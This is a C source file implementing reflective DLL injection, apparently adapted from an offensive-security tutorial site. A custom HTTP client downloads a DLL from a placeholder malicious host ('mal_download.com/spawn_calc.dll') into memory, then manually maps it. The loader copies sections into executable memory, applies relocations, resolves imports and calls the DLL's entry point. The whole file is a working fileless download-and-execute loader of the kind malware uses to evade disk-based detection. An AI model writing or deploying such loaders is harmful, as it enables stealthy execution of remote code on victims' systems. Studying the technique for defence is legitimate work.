// https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
#include <Windows.h>
#include <string.h>
#include "stdio.h"
#include <winsock2.h>

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

int reflective_loader( char* dllBytes )
{
    // get pointers to in-memory DLL headers
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);

    // Check if the dll is x86 or x64
    if( ntHeaders->FileHeader.Machine ==  IMAGE_FILE_MACHINE_I386)
    {
        // Only supporst 64 bit dll's
        printf("Invalid DLL version only supports x64\n");
        return -1;
    } 
    SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

    // allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere
    LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
    // get delta between this module's image base and the DLL that was read into memory
    DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

    // copy over DLL image headers to the newly allocated space for the DLL
    memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);

    // copy over DLL image sections to the newly allocated space for the DLL
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
        LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
        memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
        section++;
    }

    // perform image base relocations
    IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
    DWORD relocationsProcessed = 0;

    while (relocationsProcessed < relocations.Size) 
    {
        PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
        relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
        DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

        for (DWORD i = 0; i < relocationsCount; i++)
        {
            relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

            if (relocationEntries[i].Type == 0)
            {
                continue;
            }

            DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
            DWORD_PTR addressToPatch = 0;
            ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
            addressToPatch += deltaImageBase;
            memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
        }
    }
    
    // resolve import address table
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
    LPCSTR libraryName = "";
    HMODULE library = NULL;

    while (importDescriptor->Name != NULL)
    {
        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
        library = LoadLibraryA(libraryName);
        
        if (library)
        {
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

            while (thunk->u1.AddressOfData != NULL)
            {
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
                    thunk->u1.Function = functionAddress;
                }
                ++thunk;
            }
        }

        importDescriptor++;
    }

    // execute the loaded DLL
    void (*DLLEntry)(HINSTANCE, DWORD, LPVOID) = (DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    (*DLLEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

    return 0;
}

SOCKET HTTPConnectToServer(char* server){
      SOCKADDR_IN serverInfo;
      SOCKET sck; 
      WSADATA wsaData; 
      LPHOSTENT hostEntry; 
      WSAStartup(MAKEWORD(2,2),&wsaData);
      hostEntry = gethostbyname(server);
      if(!hostEntry){  
           WSACleanup();  
           return 0; 
      } 
      sck = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
      if(sck==INVALID_SOCKET){
           WSACleanup(); 
           puts("Failed to setup socket");
           getchar(); 
           return 0; 
      } 
      serverInfo.sin_family = AF_INET;
      serverInfo.sin_addr   = *((LPIN_ADDR)*hostEntry->h_addr_list); 
      serverInfo.sin_port   = htons(80); 
      int i = connect(sck,(LPSOCKADDR)&serverInfo,sizeof(struct sockaddr));
     
      if(sck==SOCKET_ERROR) return 0;
      if(i!=0) return 0;
     
      return sck;
}
 
void HTTPRequestPage(SOCKET s,char *page,char *host)
{
    unsigned int len;
    if(strlen(page)>strlen(host)){
       len=strlen(page);
    }else len = strlen(host);
     
    char message[20+len];
    if(strlen(page)<=0){
       strcpy(message,"GET / HTTP/1.1\r\n");
    }else sprintf(message,"GET %s HTTP/1.1\r\n",page);
    send(s,message,strlen(message),0);
     
    memset(message,0,sizeof(message));
    sprintf(message,"Host: %s\r\n\r\n",host);
    send(s,message,strlen(message),0);
}

int GetContentSize( char* buffer, int len )
{
    char* ptr = strtok(buffer, "\n\r");
	int ret = -1;
	while ( ptr != NULL )
	{
		ptr = strtok(NULL,"\n\r");	
		if( strncmp( ptr, "Content-Length:", 15) == 0)
		{
			ptr = &ptr[16];
			ret = atoi( ptr );	
			break;
		}
	}
	return ret;
}
 
char* DownloadToBuffer(char * webpage )
{
    int max = 0x2000;
    char* buffer = (char*)VirtualAlloc(NULL, max, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if(webpage==NULL||buffer==NULL||max==0) return FALSE;
     memset(buffer, 0, max);
     
    unsigned short shift=0;
    if(strncasecmp(webpage,"http://",strlen("http://"))==0){
        shift=strlen("http://");
    }
    if(strncasecmp(webpage+shift,"www.",strlen("www."))==0){
        shift+=strlen("www.");
    }
    char cut[strlen(webpage)-shift+1];
    strcpy(cut,strdup(webpage+shift));
     
    char *server = strtok(cut,"/");
     
    char *page = strdup(webpage+shift+strlen(server));
     
    SOCKET s = HTTPConnectToServer(server);
    HTTPRequestPage(s,page,server);
     
    int i = recv(s, buffer, max,0);
	printf("Max (%d) ret (%d)\n", max, i);
    int content_size = GetContentSize( buffer, i );
	if( content_size > 0 && content_size > max )
	{
		VirtualFree(buffer, max, NULL);
    	buffer = (char*)VirtualAlloc(NULL, content_size+10, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	}
    i = recv(s, buffer, content_size,0);
    closesocket(s);
     
    return buffer;
}
 
int main()
{
    char* dllBytes = NULL;

    dllBytes = DownloadToBuffer("http://mal_download.com/spawn_calc.dll");
    reflective_loader( dllBytes );

    free(dllBytes);

    return 0;
}